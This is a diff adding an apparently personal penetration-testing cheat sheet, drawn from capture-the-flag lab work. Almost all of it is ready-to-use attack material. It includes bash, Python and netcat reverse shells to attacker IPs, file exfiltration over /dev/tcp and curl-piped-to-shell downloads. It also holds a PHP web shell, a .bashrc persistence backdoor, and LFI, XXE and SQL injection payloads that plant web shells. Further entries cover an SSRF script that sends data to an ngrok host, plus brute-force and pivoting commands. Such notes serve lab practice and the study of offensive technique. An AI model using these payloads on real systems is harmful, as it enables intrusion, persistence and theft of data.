@@ -1,0 +1,145 @@
+
+
+#fix ssh
+    $ chmod go-w $HOME $HOME/.ssh
+    $ chmod 600 $HOME/.ssh/authorized_keys
+    $ chown `whoami` $HOME/.ssh/authorized_keys
+
+#trick
+	${IFS} instead of space in command
+	cat arc.tar > /dev/tcp/10.4.32.198/1234
+	"\";echo base64_reverse_shell | base64 -d | bash;\""
+	attacker: ncat -lvnp 80 < nmap
+	pwned:    cat > /tmp/nmap < /dev/tcp/<tunnel IP>/80
+	Tip on how to make a large (100mb) file: dd if=/dev/urandom of=bigfile.txt bs=1048576 count=100
+
+
+
+#stable shell in Linux
+	python3 -c 'import pty;pty.spawn("/bin/bash")'
+	/usr/bin/script -qc /bin/bash /dev/null
+	python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null
+	export TERM=xterm
+	Ctrl + Z
+	stty raw -echo; fg
+	Ctrl + C
+	export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+	#Listener:
+	socat file:`tty`,raw,echo=0 tcp-listen:4444
+
+	#Victim:
+	socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+
+#stable shell agains Window
+	rlwrap nc -lvnp 1234
+
+#stty
+	stty -a
+	stty rows
+	stty cols
+
+#socat
+	socat TCP-L:<port> FILE:`tty`,raw,echo=0 #fully stable linux only
+	socat TCP:<attacip>:<attacport> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+	socat TCP-L:<port> - #host
+	socat TCP:<LocalIP>:<localport> EXEC:powershell.exe,pipes #victim
+
+#reverse_shell
+	bash -i >& /dev/tcp/10.4.32.198/1234 0>&1
+	import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.32.198",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.32.198 1234 >/tmp/f
+
+
+#Local network ,smb server
+	sudo python -m SimpleHTTPServer 80 #Host
+	curl 10.4.32.198/linpeas.sh | sh #Victim
+	scp -i id_rsa ../linpeas.sh paul@10.10.11.148:/home/paul
+	python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
+	Invoke-WebRequest -uri IP/file --outfile C:....
+
+#LFI
+	CRLF : %0D%0A
+	php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
+	http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
+	http://example.thm.labs/page.php?file=php://filter/resource=/etc/passwd
+	/var/log/apache2/access.log
+	<?php system($_GET['cmd']); ?> user-agent injection
+	http://example.thm.labs/page.php?file=/etc/passwd http://example.thm.labs/page.php?file=../../../../../../etc/passwd 
+	http://example.thm.labs/page.php?file=../../../../../../etc/passwd%00 
+	http://example.thm.labs/page.php?file=....//....//....//....//etc/passwd 
+	http://example.thm.labs/page.php?file=%252e%252e%252fetc%252fpasswd
+
+	PHP session
+	https://10-10-30-83.p.thmlabs.com/login.php?err=/tmp/sess_vc4567al6pq7usm2cufmilkm45
+	c:\Windows\Temp
+	../../../../../../../../windows/system32/drivers/etc/hosts
+	/tmp/
+	/var/lib/php5
+	/var/lib/php/session
+
+#binary change path
+	export PATH=/home/archangel/secret:$PATH
+
+#PHP back door
+<?php
+    if (isset($_REQUEST['cmd'])) {
+        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+    }
+?>
+
+#.bashrc backdoor
+	echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
+
+#port forward
+	ssh user@<target ip> -i id_rsa -L random_our_port:IP_target:target_port -fN
+
+#port forward reverse
+	ssh-keygen
+	#in authorized_key
+	command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
+	sudo systemctl start ssh
+	ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+
+	#plink.exe
+	puttygen KEYFILE -o OUTPUT_KEY.ppk
+	cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
+
+#chisel
+	Compromise_machine
+	./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+	Attack_machine
+	./chisel server -p LISTEN_PORT --reverse &
+
+#hydra
+	hydra -l <username> -P <wordlist> 10.10.223.193 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+#wordpres
+	wpscan --url http://repairshop.sbrc/  -e vt,u,ap
+	cewl http://repairshop.sbrc > wordlist
+	wpscan --url http://repairshop.sbrc -U user -P wordlist
+
+#docker
+	grep 'docker\|lxc' /proc/1/cgroup
+
+#XXE
+	<?xml version="1.0" encoding="UTF-8"?>
+	<!DOCTYPE replace [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
+#SQLI
+	' UNION SELECT 1,sqlite_version()--
+	' UNION SELECT 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%'--
+	" union all select 1,2,3,group_concat(user,0x3a,file_priv) from mysql.user -- -
+	UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php system($_GET['cmd']); ?>'
+	union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
+#SSRF
+	var xhr = new XMLHttpRequest();
+	xhr.open("GET","https://localhost:8443/")
+	xhr.onload = function(){
+	    var flag="asdsa";
+	    var e= new XMLHttpRequest();
+	    e.open("GET","https://f26e-171-224-19-128.ngrok.io/flag="+flag);
+	    e.send();
+	};
+	xhr.send();
+
+
